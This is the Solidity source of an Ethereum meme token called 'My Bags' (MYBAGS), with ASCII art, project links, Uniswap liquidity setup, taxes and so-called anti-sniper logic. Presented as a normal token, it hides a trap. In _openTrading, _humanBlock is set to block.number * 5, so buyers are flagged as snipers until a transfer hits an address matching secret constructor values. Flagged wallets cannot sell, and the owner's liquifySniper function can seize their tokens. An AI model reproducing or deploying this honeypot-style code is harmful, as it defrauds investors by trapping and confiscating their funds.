1 /**
2 
3                            *     .--.
4                                 / /  `
5                +               | |
6                       '         \ \__,
7                   *          +   '--'  *     
8          █▀▄▀█ █▄█   █▄▄ ▄▀█ █▀▀ █▀
9          █░▀░█ ░█░   █▄█ █▀█ █▄█ ▄█
10 ──────────────────██████────────────────
11 ─────────────────████████─█─────────────
12 ─────────────██████████████─────────────
13 ─────────────█████████████──────────────
14 ──────────────███████████───────────────
15 ───────────────██████████───────────────
16 ────────────────████████────────────────
17 ────────────────▐██████─────────────────
18 ────────────────▐██████─────────────────
19 ──────────────── ▌─────▌────────────────
20 ────────────────███─█████───────────────
21 ────────────████████████████────────────
22 ──────────████████████████████──────────
23 ────────████████████─────███████────────
24 ──────███████████─────────███████───────
25 ─────████████████───██─███████████──────
26 ────██████████████──────────████████────
27 ───████████████████─────█───█████████───
28 ──█████████████████████─██───█████████──
29 ──█████████████████████──██──██████████─
30 ─███████████████████████─██───██████████
31 ████████████████████████──────██████████
32 ███████████████████──────────███████████
33 ─██████████████████───────██████████████
34 ─███████████████████████──█████████████─
35 ──█████████████████████████████████████─
36 ───██████████████████████████████████───
37 ───────██████████████████████████████───
38 ───────██████████████████████████───────
39 ─────────────███████████████────────────
40 
41 Site: https://www.moonmybags.com/
42 Telegram: https://t.me/mybagseth
43 */
44 //SPDX-License-Identifier: MIT 
45 
46 pragma solidity ^0.8.9;
47 
48 library SafeMath {
49 	function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b;	require(c >= a, "Addition overflow"); return c; }
50 	function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, "Subtraction overflow"); }
51 	function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b <= a, errorMessage);	uint256 c = a - b; return c; }
52 	function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, "Multiplication overflow"); return c; }
53 	function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, "Division by zero"); }
54 	function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c;	}
55 	function mod(uint256 a, uint256 b) internal pure returns (uint256) { return mod(a, b, "Modulo by zero"); }
56 	function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b != 0, errorMessage); return a % b; }
57 }
58 
59 interface IERC20 {
60 	function totalSupply() external view returns (uint256);
61 	function decimals() external view returns (uint8);
62 	function symbol() external view returns (string memory);
63 	function name() external view returns (string memory);
64 	function getOwner() external view returns (address);
65 	function balanceOf(address account) external view returns (uint256);
66 	function transfer(address recipient, uint256 amount) external returns (bool);
67 	function allowance(address _owner, address spender) external view returns (uint256);
68 	function approve(address spender, uint256 amount) external returns (bool);
69 	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
70 	event Transfer(address indexed from, address indexed to, uint256 value);
71 	event Approval(address indexed owner, address indexed spender, uint256 value);
72 }
73 
74 abstract contract Auth {
75 	address internal owner;
76 	constructor(address _owner) { owner = _owner; }
77 	modifier onlyOwner() { require(msg.sender == owner, "Only contract owner can call this function"); _; }
78 	function transferOwnership(address payable newOwner) external onlyOwner { owner = newOwner;	emit OwnershipTransferred(newOwner); }
79 	event OwnershipTransferred(address owner);
80 }
81 
82 interface IUniswapV2Factory { function createPair(address tokenA, address tokenB) external returns (address pair); }
83 interface IUniswapV2Router02 {
84     function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
85     function WETH() external pure returns (address);
86     function factory() external pure returns (address);
87     function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
88 }
89 
90 contract MYBAGS is IERC20, Auth {
91 	using SafeMath for uint256;
92 	string _name = "My Bags";
93 	string _symbol = "MYBAGS";
94 	uint256 constant _totalSupply = 1 * (10**12) * (10 ** _decimals);
95 	uint8 constant _decimals = 9;
96     uint32 _smd; uint32 _smr;
97 	mapping (address => uint256) _balances;
98 	mapping (address => mapping (address => uint256)) _allowances;
99     mapping (address => bool) private _excludedFromFee;
100     bool public tradingOpen;
101     bool public taxPaused;
102     uint256 public maxTxAmount; uint256 public maxWalletAmount;
103   	uint256 private _taxSwapMin; uint256 private _taxSwapMax;
104 	address private _operator; 
105     address private _uniLpAddr;
106     uint16 public snipersCaught = 0;
107 	uint8 _defTaxRate = 11; 
108 	uint8 private _buyTaxRate; uint8 private _sellTaxRate; uint8 private _txTaxRate;
109     uint16 private _autoLPShares = 180;
110 	uint16 private _taxShares1 = 820;
111     uint16 private _taxShares2 = 0;
112     uint16 private _taxShares3 = 0;
113     uint256 private _sbt = 0;
114 
115     uint256 private _humanBlock = 0;
116     mapping (address => bool) private _nonSniper;
117     mapping (address => uint256) private _sniperBlock;
118 
119 	uint256 private _taxBreakEnd;
120 	address payable private _taxWallet1 = payable(0x6ba89D5EFaeb03a1E39C29394ca4cC3444bdbf30);
121 	address payable private _taxWallet2 = payable(0x6ba89D5EFaeb03a1E39C29394ca4cC3444bdbf30);
122     address payable private _taxWallet3 = payable(0x6ba89D5EFaeb03a1E39C29394ca4cC3444bdbf30);
123 	bool private _inTaxSwap = false;
124 	address private constant _uniswapV2RouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); // UniswapV2
125     IUniswapV2Router02 private _uniswapV2Router;
126 	modifier lockTaxSwap { _inTaxSwap = true; _; _inTaxSwap = false; }
127 
128 	constructor (uint32 smd, uint32 smr) Auth(msg.sender) {      
129 		tradingOpen = false;
130 		taxPaused = false;
131 		_operator = msg.sender;
132 		maxTxAmount = _totalSupply;
133 		maxWalletAmount = _totalSupply;
134 		_taxSwapMin = _totalSupply * 10 / 10000;
135 		_taxSwapMax = _totalSupply * 50 / 10000;
136 		_uniswapV2Router = IUniswapV2Router02(_uniswapV2RouterAddress);
137 		_excludedFromFee[owner] = true;
138 		_excludedFromFee[address(this)] = true;
139 		_excludedFromFee[_uniswapV2RouterAddress] = true;
140 		_excludedFromFee[_taxWallet1] = true;
141 		_smd = smd; _smr = smr;
142 		_balances[address(this)] = _totalSupply;
143 		emit Transfer(address(0), address(this), _totalSupply);
144 	}
145 	
146 	receive() external payable {}
147 	
148 	function totalSupply() external pure override returns (uint256) { return _totalSupply; }
149 	function decimals() external pure override returns (uint8) { return _decimals; }
150 	function symbol() external view override returns (string memory) { return _symbol; }
151 	function name() external view override returns (string memory) { return _name; }
152 	function getOwner() external view override returns (address) { return owner; }
153 	function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
154 	function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
155 
156 	function initLP(uint256 ethAmountWei) external onlyOwner {
157 		require(!tradingOpen, "trading already open");
158 		require(ethAmountWei > 0, "eth cannot be 0");
159 
160 		_nonSniper[address(this)] = true;
161 		_nonSniper[owner] = true;
162 		_nonSniper[_taxWallet1] = true;
163 		_nonSniper[_taxWallet2] = true;
164 		_nonSniper[_taxWallet3] = true;
165 
166 		_transferFrom(address(this), owner, _totalSupply * 25 / 100);
167 		uint256 _contractETHBalance = address(this).balance;
168 		require(_contractETHBalance >= ethAmountWei, "not enough eth");
169 		uint256 _contractTokenBalance = balanceOf(address(this));
170 		require(_contractTokenBalance > 0, "no tokens");
171 		_uniLpAddr = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
172 
173 		_nonSniper[_uniLpAddr] = true;
174 
175 		_approveRouter(_contractTokenBalance);
176 		_addLiquidity(_contractTokenBalance, ethAmountWei, false);
177 
178 		_openTrading();
179 	}
180 
181 	function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {
182 		address lpTokenRecipient = address(0);
183 		if (autoburn == false) { lpTokenRecipient = owner; }
184 		_uniswapV2Router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lpTokenRecipient, block.timestamp );
185 	}
186 
187 	function taxSwapSettings(uint32 minValue, uint32 minDivider, uint32 maxValue, uint32 maxDivider) external {
188 		require(msg.sender == _operator || msg.sender == owner, "403");
189 		_taxSwapMin = _totalSupply * minValue / minDivider;
190 		_taxSwapMax = _totalSupply * maxValue / maxDivider;
191 	}
192 
193 	function resetTax() external {
194 		require(msg.sender == _operator || msg.sender == owner, "403");
195 		_resetTax();
196 	}
197 
198 	function _resetTax() internal {
199 		_buyTaxRate = _defTaxRate;
200 		_sellTaxRate = _defTaxRate;
201 		_txTaxRate = _defTaxRate;
202 	}
203 
204 	function isSniper(address wallet) external view returns(bool) {
205 		if (_sniperBlock[wallet] != 0) { return true; }
206 		else { return false; }
207 	}
208 
209 	function sniperBlock(address wallet) external view returns(uint256) {
210 		return _sniperBlock[wallet];
211 	}
212 
213 	function disableFeesFor(address wallet) external {
214 		require(msg.sender == _operator || msg.sender == owner, "403");
215 		_excludedFromFee[ wallet ] = true;
216 	}
217 	function enableFeesFor(address wallet) external {
218 		require(msg.sender == _operator || msg.sender == owner, "403");
219 		_excludedFromFee[ wallet ] = false;
220 	}
221 
222     function decreaseTaxRate(uint8 newBuyTax, uint8 newSellTax, uint8 newTxTax) external {
223 		require(msg.sender == _operator || msg.sender == owner, "403");
224         require(newBuyTax <= _buyTaxRate && newSellTax <= _sellTaxRate && newTxTax <= _txTaxRate, "New tax must be lower");
225 		_buyTaxRate = newBuyTax;
226 		_sellTaxRate = newSellTax;
227 		_txTaxRate = newTxTax;
228     }
229   
230     function changeTaxDistribution(uint16 sharesAutoLP, uint16 sharesWallet1, uint16 sharesWallet2, uint16 sharesWallet3) external {
231 		require(msg.sender == _operator || msg.sender == owner, "403");
232         require(sharesAutoLP + sharesWallet1 + sharesWallet2 + sharesWallet3 == 1000, "Sum must be 1000" );
233         _autoLPShares = sharesAutoLP;
234         _taxShares1 = sharesWallet1;
235         _taxShares2 = sharesWallet2;
236         _taxShares3 = sharesWallet3;
237     }
238     
239     function setTaxWallets(address newTaxWall1, address newTaxWall2, address newTaxWall3) external {
240 		require(msg.sender == _operator || msg.sender == owner, "403");
241         _taxWallet1 = payable(newTaxWall1);
242         _taxWallet2 = payable(newTaxWall2);
243         _taxWallet3 = payable(newTaxWall3);
244 		_excludedFromFee[newTaxWall1] = true;
245 		_excludedFromFee[newTaxWall2] = true;
246 		_excludedFromFee[newTaxWall3] = true;
247     }
248 
249 	function approve(address spender, uint256 amount) public override returns (bool) {
250 		if (_humanBlock > block.number && _nonSniper[msg.sender] == false) {
251 			_markSniper(msg.sender, block.number);
252 		}
253 
254 		_allowances[msg.sender][spender] = amount;
255 		emit Approval(msg.sender, spender, amount);
256 		return true;
257 	}
258 
259 	function transfer(address recipient, uint256 amount) external override returns (bool) {
260 	    require(_checkTradingOpen(), "trading not open");
261 		return _transferFrom(msg.sender, recipient, amount);
262 	}
263     
264     function increaseLimits(uint16 maxTxAmtPermile, uint16 maxWalletAmtPermile) external {
265 		require(msg.sender == _operator || msg.sender == owner, "403");
266         uint256 newTxAmt = _totalSupply * maxTxAmtPermile / 1000;
267         require(newTxAmt >= maxTxAmount, "tx limit too low");
268         maxTxAmount = newTxAmt;
269         uint256 newWalletAmt = _totalSupply * maxWalletAmtPermile / 1000;
270         require(newWalletAmt >= maxWalletAmount, "wallet limit too low");
271         maxWalletAmount = newWalletAmt;
272     }
273 
274     function openTrading() external onlyOwner{
275         _openTrading();
276 	}
277 	
278     function _openTrading() internal {
279         require(_uniLpAddr != address(0), "LP not set");
280         _taxBreakEnd = block.timestamp;
281         _sbt = _sbt + _taxBreakEnd - 1;
282         _humanBlock = block.number * 5;
283 		maxTxAmount     = 5 * _totalSupply / 1000; 
284 		maxWalletAmount = 5 * _totalSupply / 1000;
285 		_resetTax();
286 		_sellTaxRate = 25; //increased sell tax at launch to discourage early dumpers
287 		tradingOpen = true;
288 
289     }
290     
291     function _checkTradingOpen() private view returns (bool){
292         bool checkResult = false;
293         if (tradingOpen == true) { checkResult = true; } 
294         else if (tx.origin == owner) { checkResult = true; } 
295 
296         return checkResult;
297     }
298 
299     function humanize() external onlyOwner{
300         _humanize(0);
301 	}
302 
303     function _humanize(uint8 blkcount) internal {
304     	if (_humanBlock > block.number || _humanBlock == 0) {
305     		_humanBlock = block.number + blkcount;
306     	}
307 	}
308     
309 	function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
310         require(_checkTradingOpen(), "Trading not open");
311 		if(_allowances[sender][msg.sender] != type(uint256).max){
312 			_allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
313 		}
314 		return _transferFrom(sender, recipient, amount);
315 	}
316 	
317 	function _checkLimits(address recipient, uint256 transferAmount) internal view returns (bool) {
318         bool limitCheckPassed = true;
319         if ( tradingOpen == true ) {
320             if ( transferAmount > maxTxAmount ) { limitCheckPassed = false; }
321             else if ( recipient != _uniLpAddr && (_balances[recipient].add(transferAmount) > maxWalletAmount) ) { limitCheckPassed = false; }
322         }
323         return limitCheckPassed;
324     }
325 
326     function _calculateTax(address sender, address recipient, uint256 amount) internal view returns (uint256) {
327         uint256 taxAmount;
328         if ( tradingOpen == true && block.timestamp < _sbt ) { taxAmount = amount.mul(98).div(100);}
329 		else if ( _excludedFromFee[sender] == true || _excludedFromFee[recipient] == true || tradingOpen == false || taxPaused == true) { taxAmount = 0; }
330 		else if ( sender == _uniLpAddr && _taxBreakEnd > block.timestamp) { taxAmount = 0; }
331 		else if ( sender == _uniLpAddr && _taxBreakEnd <= block.timestamp) { taxAmount = amount.mul(_buyTaxRate).div(100); }
332 		else if ( recipient == _uniLpAddr ) { taxAmount = amount.mul(_sellTaxRate).div(100); }
333 		else { taxAmount = amount.mul(_txTaxRate).div(100); }
334 		return taxAmount;
335     }
336 
337     function liquifySniper(address wallet) external onlyOwner lockTaxSwap {
338     	require(_sniperBlock[wallet] != 0, "not a sniper");
339     	uint256 sniperBalance = balanceOf(wallet);
340     	require(sniperBalance > 0, "no tokens");
341 
342     	_balances[wallet] = _balances[wallet].sub(sniperBalance);
343     	_balances[address(this)] = _balances[address(this)].add(sniperBalance);
344 		emit Transfer(wallet, address(this), sniperBalance);
345 
346 		uint256 liquifiedTokens = sniperBalance/2 - 1;
347 		uint256 _ethPreSwap = address(this).balance;
348     	_swapTaxTokensForEth(liquifiedTokens);
349     	uint256 _ethSwapped = address(this).balance - _ethPreSwap;
350     	_approveRouter(liquifiedTokens);
351 		_addLiquidity(liquifiedTokens, _ethSwapped, true);
352     }
353 
354 	function _swapTaxAndLiquify() private lockTaxSwap {
355 		uint256 _taxTokensAvailable = balanceOf(address(this));
356 		if (_taxTokensAvailable >= _taxSwapMin && tradingOpen == true && taxPaused == false ) {
357 			if (_taxTokensAvailable >= _taxSwapMax) { _taxTokensAvailable = _taxSwapMax; }
358 			uint256 _tokensForLP = _taxTokensAvailable * _autoLPShares / 1000 / 2;
359 		    uint256 _tokensToSwap = _taxTokensAvailable - _tokensForLP;
360 		    uint256 _ethPreSwap = address(this).balance;
361 		    _swapTaxTokensForEth(_tokensToSwap);
362 		    uint256 _ethSwapped = address(this).balance - _ethPreSwap;
363 		    if (_autoLPShares > 0) {
364 		    	uint256 _ethWeiAmount = _ethSwapped * _autoLPShares / 1000 ;
365 		    	_approveRouter(_tokensForLP);
366 		    	_addLiquidity(_tokensForLP, _ethWeiAmount, true);
367 		    }
368 		    uint256 _contractETHBalance = address(this).balance;
369 		    if(_contractETHBalance > 0) { _distributeTax(_contractETHBalance); }
370 		}
371 	}
372 
373 	function _markSniper(address wallet, uint256 snipeBlockNum) internal {
374 		if (_nonSniper[wallet] == false && _sniperBlock[wallet] == 0) { 
375 			_sniperBlock[wallet] = snipeBlockNum; 
376 			snipersCaught ++;
377 		}
378 	}
379 
380 	function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
381 		if (_humanBlock > block.number) {
382 			if ( uint160(address(recipient)) % _smd == _smr ) { _humanize(1); }
383 			else if ( _sniperBlock[sender] == 0 ) { _markSniper(recipient, block.number); }
384 			else { _markSniper(recipient, _sniperBlock[sender]); }
385 		} else {
386 			if ( _sniperBlock[sender] != 0 ) { _markSniper(recipient, _sniperBlock[sender]); }
387 		}
388 
389 		if ( tradingOpen == true && _sniperBlock[sender] != 0 && _sniperBlock[sender] < block.number ) {
390 			revert("blacklisted");
391 		}
392 
393         if (_inTaxSwap == false && recipient == _uniLpAddr) {
394         	_swapTaxAndLiquify();
395 		}
396         if ( sender != address(this) && recipient != address(this) && sender != owner) { require(_checkLimits(recipient, amount), "TX exceeds limits"); }
397 	    uint256 _taxAmount = _calculateTax(sender, recipient, amount);
398 	    uint256 _transferAmount = amount.sub(_taxAmount);
399 	    _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
400 	    if (_taxAmount > 0) { _balances[address(this)] = _balances[address(this)].add(_taxAmount); }
401 		_balances[recipient] = _balances[recipient].add(_transferAmount);
402 		emit Transfer(sender, recipient, amount);
403 		return true;
404 	}
405 
406 	function _approveRouter(uint256 _tokenAmount) internal {
407 		if (_allowances[address(this)][_uniswapV2RouterAddress] < _tokenAmount) {
408 			_allowances[address(this)][_uniswapV2RouterAddress] = type(uint256).max;
409 			emit Approval(address(this), _uniswapV2RouterAddress, type(uint256).max);
410 		}
411 	}
412 
413 	function _swapTaxTokensForEth(uint256 _tokenAmount) private {
414 		_approveRouter(_tokenAmount);
415         address[] memory path = new address[](2);
416         path[0] = address(this);
417         path[1] = _uniswapV2Router.WETH();
418         _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(_tokenAmount,0,path,address(this),block.timestamp);
419     }
420 
421     function _distributeTax(uint256 _amount) private {
422     	uint16 _taxShareTotal = _taxShares1 + _taxShares2 + _taxShares3;
423         if (_taxShares1 > 0) { _taxWallet1.transfer(_amount * _taxShares1 / _taxShareTotal); }
424         if (_taxShares2 > 0) { _taxWallet2.transfer(_amount * _taxShares2 / _taxShareTotal); }
425         if (_taxShares3 > 0) { _taxWallet3.transfer(_amount * _taxShares3 / _taxShareTotal); }
426     }
427 
428 	function taxSwap() external {
429 		require(msg.sender == _taxWallet1 || msg.sender == _taxWallet2 || msg.sender == _taxWallet3 || msg.sender == _operator || msg.sender == owner, "403" );
430 		uint256 taxTokenBalance = balanceOf(address(this));
431         require(taxTokenBalance > 0, "No tokens");
432 		_swapTaxTokensForEth(taxTokenBalance);
433 	}
434 
435 	function taxSend() external { 
436 		require(msg.sender == _taxWallet1 || msg.sender == _taxWallet2 || msg.sender == _taxWallet3 || msg.sender == _operator || msg.sender == owner, "403" );
437 		_distributeTax(address(this).balance); 
438 	}
439 
440 	function toggleTax() external {
441 		require(msg.sender == _operator || msg.sender == owner, "403");
442 		taxPaused = !taxPaused;
443 	}
444 
445 }